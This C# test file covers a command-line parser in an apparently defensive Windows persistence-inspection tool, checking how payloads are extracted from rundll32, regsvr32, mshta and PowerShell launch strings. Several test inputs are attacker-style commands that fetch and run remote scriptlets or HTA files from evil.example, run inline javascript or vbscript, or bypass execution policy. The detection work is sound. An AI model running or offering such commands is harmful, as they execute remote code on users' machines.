using PCPorter.Collectors.Persistence;
using PCPorter.Collectors.Sources;
using PCPorter.TestKit;

namespace PCPorter.Collectors.Tests.Persistence;

public class CommandLineTests
{
    [Fact]
    public void Rundll32_payload_is_the_dll_before_the_comma()
    {
        var c = CommandLine.Parse("rundll32 x.dll,Entry");
        Assert.Equal(@"%SystemRoot%\System32\rundll32.exe", c.Image);
        Assert.Equal("rundll32", c.Host);
        Assert.Equal(@"%SystemRoot%\System32\x.dll", c.Payload);
        Assert.Equal("x.dll,Entry", c.Arguments);
    }

    [Fact]
    public void Rundll32_with_quoted_dll_path()
    {
        var c = CommandLine.Parse(@"C:\Windows\System32\rundll32.exe ""C:\Users\bob\AppData\Local\a b\x.dll"",Start /q");
        Assert.Equal(@"C:\Users\bob\AppData\Local\a b\x.dll", c.Payload);
    }

    [Fact]
    public void Rundll32_javascript_is_inline()
    {
        var c = CommandLine.Parse(@"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";alert(1)");
        Assert.True(c.Inline);
        Assert.Null(c.Payload);
    }

    [Fact]
    public void Unquoted_path_with_spaces_uses_longest_existing_prefix()
    {
        var exists = (string p) => p == @"C:\Program Files\My App\app.exe";
        var c = CommandLine.Parse(@"C:\Program Files\My App\app.exe -min C:\data", exists);
        Assert.Equal(@"C:\Program Files\My App\app.exe", c.Image);
        Assert.Equal(@"-min C:\data", c.Arguments);
        Assert.True(c.UnquotedPath);
        Assert.False(c.Quoted);
        Assert.Equal(c.Image, c.Payload);
    }

    [Fact]
    public void Unquoted_path_with_spaces_falls_back_to_executable_extension()
    {
        var c = CommandLine.Parse(@"C:\Program Files\My App\app.exe /background", _ => false);
        Assert.Equal(@"C:\Program Files\My App\app.exe", c.Image);
        Assert.True(c.UnquotedPath);
    }

    [Fact]
    public void Unquoted_path_with_no_clue_takes_the_first_token_and_flags_it()
    {
        var c = CommandLine.Parse(@"C:\Program Files\Thing\thing", _ => false);
        Assert.Equal(@"C:\Program", c.Image);
        Assert.True(c.UnquotedPath);
    }

    [Fact]
    public void Unquoted_path_without_spaces_is_not_flagged()
    {
        var c = CommandLine.Parse(@"C:\Windows\system32\svchost.exe -k netsvcs -p", p => p == @"C:\Windows\system32\svchost.exe");
        Assert.Equal(@"C:\Windows\system32\svchost.exe", c.Image);
        Assert.Equal("-k netsvcs -p", c.Arguments);
        Assert.False(c.UnquotedPath);
    }

    [Fact]
    public void Quoted_path_with_arguments()
    {
        var c = CommandLine.Parse(@"""C:\Program Files\App\app.exe"" --background ""x y""");
        Assert.True(c.Quoted);
        Assert.False(c.UnquotedPath);
        Assert.Equal(@"C:\Program Files\App\app.exe", c.Image);
        Assert.Equal(@"--background ""x y""", c.Arguments);
    }

    [Fact]
    public void Env_vars_are_left_for_MapPath()
    {
        var c = CommandLine.Parse(@"%SystemRoot%\System32\x.exe /a");
        Assert.Equal(@"%SystemRoot%\System32\x.exe", c.Image);
    }

    [Theory]
    [InlineData(@"regsvr32 /s /n /u /i:http://evil.example/x.sct scrobj.dll", @"%SystemRoot%\System32\scrobj.dll")]
    [InlineData(@"wscript.exe //B //Nologo ""C:\Users\bob\AppData\Roaming\x.vbs"" arg", @"C:\Users\bob\AppData\Roaming\x.vbs")]
    [InlineData(@"cscript C:\scripts\run.js", @"C:\scripts\run.js")]
    [InlineData(@"powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\s t\a.ps1"" -x 1", @"C:\s t\a.ps1")]
    [InlineData(@"pwsh -f C:\a.ps1", @"C:\a.ps1")]
    [InlineData(@"pwsh C:\a.ps1", @"C:\a.ps1")]
    [InlineData(@"cmd /c start """" ""C:\x y\app.exe"" /q", @"C:\x y\app.exe")]
    [InlineData(@"cmd.exe /c """"C:\a b\x.bat"" arg""", @"C:\a b\x.bat")]
    [InlineData(@"C:\Windows\System32\cmd.exe /C powershell -File C:\z.ps1 & exit", @"C:\z.ps1")]
    [InlineData(@"cmd /k C:\tools\t.exe", @"C:\tools\t.exe")]
    public void Effective_payload_of_lolbin_hosts(string command, string payload) =>
        Assert.Equal(payload, CommandLine.Parse(command).Payload);

    [Fact]
    public void Mshta_url_and_inline()
    {
        var url = CommandLine.Parse("mshta http://evil.example/a.hta");
        Assert.True(url.PayloadIsUrl);
        Assert.Equal("http://evil.example/a.hta", url.Payload);
        var inline = CommandLine.Parse(@"mshta vbscript:Execute(""CreateObject(""""WScript.Shell"""").Run """"calc"""""")");
        Assert.True(inline.Inline);
        Assert.Null(inline.Payload);
    }

    [Fact]
    public void Powershell_inline_command_has_no_payload_file()
    {
        var c = CommandLine.Parse(@"powershell -w hidden -c ""Get-Date""");
        Assert.True(c.Inline);
        Assert.Null(c.Payload);
    }

    [Fact]
    public void Empty_and_whitespace_commands()
    {
        Assert.Null(CommandLine.Parse(null).Image);
        Assert.Null(CommandLine.Parse("   ").Payload);
    }

    [Fact]
    public void Tokenizer_groups_quotes()
    {
        Assert.Equal(["a", "b c", "d"], CommandLine.Tokenize(@"a ""b c"" d"));
        Assert.Equal([@"C:\a b\x.dll,Entry"], CommandLine.Tokenize(@"""C:\a b\x.dll"",Entry"));
    }

    [Fact]
    public void SystemRoot_is_expanded_and_mapped_before_the_signature_check()
    {
        var root = Directory.CreateTempSubdirectory("pcporter-cmd").FullName;
        try
        {
            using var src = new FakeSystemSource(root);
            var sigs = new FakeSignatures(_ => FakeSignatures.Microsoft);
            var item = PersistenceCollector.Evaluate(new PersistenceEntry("t", "n", @"%SystemRoot%\System32\x.exe /a"), src, sigs);
            Assert.Equal(@"C:\Windows\System32\x.exe", item.ImagePath);
            Assert.Equal(@"C:\Windows\System32\x.exe", item.PayloadPath);
            Assert.Equal(Path.Combine(root, @"Windows\System32\x.exe"), Assert.Single(sigs.Checked));
            Assert.Equal("MICROSOFT", item.RuleId);
            Assert.True(item.IsHidden);
        }
        finally { Directory.Delete(root, true); }
    }

    [Fact]
    public void Item_key_is_stable_and_normalized()
    {
        var a = PersistenceItem.MakeKey("L", "N", @"  C:\X.exe   /a ");
        var b = PersistenceItem.MakeKey("L", "N", @"c:\x.exe /A");
        Assert.Equal(a, b);
        Assert.StartsWith("L|N|", a);
        Assert.Equal(4 + 64, a.Length);
        Assert.NotEqual(a, PersistenceItem.MakeKey("L", "N", @"c:\y.exe"));
    }
}
